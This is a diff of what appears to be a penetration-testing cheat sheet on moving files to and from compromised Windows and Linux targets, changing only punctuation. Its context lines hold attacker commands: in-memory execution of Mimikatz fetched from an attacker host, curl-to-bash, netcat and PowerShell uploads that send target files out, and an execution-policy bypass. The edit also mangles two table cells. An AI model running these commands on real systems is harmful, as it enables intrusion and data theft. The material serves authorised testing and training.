@@ -6,7 +6,7 @@ description = "Uploading and downloading files to and from Windows and Linux tar
 draft = false
 +++
 
-## Attacker — Quick Servers
+## Attacker: Quick Servers
 
 ```bash
 # HTTP server
@@ -26,7 +26,7 @@ python3 -m uploadserver          # listens on 8000, /upload endpoint
 
 ---
 
-## Linux — Download to Target
+## Linux: Download to Target
 
 ```bash
 # wget
@@ -54,7 +54,7 @@ smbclient //<attacker>/share -N -c "get file /tmp/file"
 
 ---
 
-## Linux — Upload from Target
+## Linux: Upload from Target
 
 ```bash
 # SCP to attacker
@@ -80,17 +80,17 @@ print(r.text)
 
 ---
 
-## Windows — Download to Target
+## Windows: Download to Target
 
 ```powershell
-# PowerShell — most reliable
+# PowerShell: most reliable
 Invoke-WebRequest -Uri http://<attacker>/file.exe -OutFile C:\temp\file.exe
 iwr http://<attacker>/file.exe -o C:\temp\file.exe   # alias
 
 # WebClient
 (New-Object Net.WebClient).DownloadFile('http://<attacker>/file.exe','C:\temp\file.exe')
 
-# DownloadString (execute in memory — no disk write)
+# DownloadString (execute in memory: no disk write)
 IEX (New-Object Net.WebClient).DownloadString('http://<attacker>/script.ps1')
 IEX (iwr http://<attacker>/script.ps1 -UseBasicParsing)
 
@@ -115,7 +115,7 @@ powershell -ExecutionPolicy Bypass -File script.ps1
 
 ---
 
-## Windows — Upload from Target
+## Windows: Upload from Target
 
 ```powershell
 # PowerShell POST (to uploadserver)
@@ -125,10 +125,10 @@ Invoke-WebRequest -Uri http://<attacker>:8000/upload -Method POST -InFile C:\pat
 $form = @{ files = Get-Item C:\path\file }
 Invoke-RestMethod -Uri http://<attacker>:8000/upload -Method Post -Form $form
 
-# SMB — copy to share
+# SMB: copy to share
 copy C:\path\file \\<attacker>\share\
 
-# nc — pipe file
+# nc: pipe file
 nc.exe <attacker> 9999 < C:\path\file
 # Attacker: nc -lvnp 9999 > received_file
 
@@ -142,19 +142,19 @@ nc.exe <attacker> 9999 < C:\path\file
 ## Base64 Transfer (Copy-Paste Safe)
 
 ```bash
-# Linux — encode
+# Linux: encode
 base64 -w 0 file > file.b64
 cat file.b64   # copy output
 
-# Linux — decode
+# Linux: decode
 echo "<paste>" | base64 -d > file
 ```
 
 ```powershell
-# Windows — encode
+# Windows: encode
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\file")) | Out-File file.b64
 
-# Windows — decode
+# Windows: decode
 [IO.File]::WriteAllBytes("C:\file", [Convert]::FromBase64String((Get-Content file.b64)))
 ```
 
@@ -163,16 +163,16 @@ echo "<paste>" | base64 -d > file
 ## Execute Without Disk Write
 
 ```powershell
-# PowerShell — download and run script in memory
+# PowerShell: download and run script in memory
 IEX (New-Object Net.WebClient).DownloadString('http://<attacker>/Invoke-Mimikatz.ps1')
 
-# PowerShell — download and run PE from memory
+# PowerShell: download and run PE from memory
 $bytes = (New-Object Net.WebClient).DownloadData('http://<attacker>/tool.exe')
-# (requires reflective loading — use tools like Invoke-ReflectivePEInjection)
+# (requires reflective loading: use tools like Invoke-ReflectivePEInjection)
 ```
 
 ```bash
-# Linux — pipe directly to bash
+# Linux: pipe directly to bash
 curl -s http://<attacker>/script.sh | bash
 wget -qO- http://<attacker>/script.sh | bash
 ```
@@ -200,7 +200,7 @@ certutil -hashfile C:\path\file MD5
 |--------|---------------|--------------|-----------------|----------------|
 | HTTP | wget/curl | curl POST | iwr/WebClient | iwr POST |
 | SMB | smbclient get | smbclient put | copy \\share\ | copy to \\share |
-| SCP | scp | scp | — | — |
+| SCP | scp | scp |: |: |
 | nc | nc redirect | nc pipe | nc.exe redirect | nc.exe pipe |
 | base64 | base64 -d | base64 | FromBase64String | ToBase64String |
-| certutil | — | — | certutil -urlcache | certutil -encode |
+| certutil |: |: | certutil -urlcache | certutil -encode |
